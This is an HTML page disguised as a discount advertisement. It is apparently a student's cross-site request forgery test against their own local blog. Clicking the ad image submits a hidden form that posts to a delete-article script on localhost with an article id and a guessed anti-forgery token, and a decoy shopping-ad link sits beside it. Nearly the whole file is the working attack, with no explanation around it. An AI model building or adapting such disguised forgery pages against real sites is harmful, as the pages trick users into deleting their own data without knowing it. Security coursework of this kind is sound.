<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
    <title>Test to Delete the Data in my blogs.</title>
    <meta name="description" content="優惠廣告!">
    <meta name="author" content="tseng">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
  </head>
  <body>
    <div class="main">
      <div class="container">
        <div class="row">
          <div class="col-sm">
            <div class="alert alert-primary" role="alert">
              <p class="text-center">特價優惠商品!</p>
            </div>
          </div>
			
			<!-- 惡意圖片 -->
			<iframe style="display:none" name="csrf-frame"></iframe>
			<form method='POST' action="http://localhost/13/php/delete_article.php"> <!-- 執行刪除文章 -->
			  <input type='hidden' name='i' value='55'> <!-- 刪除 id=? 的文章 -->		  
			  <input type='hidden' name='mycsrftoken' value='IDontKnow.'>		  
			  <input type='image' src="https://i.imgur.com/67SVgAE.png">
			</form>
					  		
		  <a href="https://www.uniqlo.com/tw/?gclid=CjwKCAjw5cL2BRASEiwAENqAPvFIzONBhsBFg6kj6Jw2AoHeBtrtz--b9mX5twrfUrhRuVl3NLExnBoCbE4QAvD_BwE&gclsrc=aw.ds" target="_blank"><img src="https://i.imgur.com/MzBXqBE.png"></a>
        </div>
      </div>
    </div>
  </body>
</html>
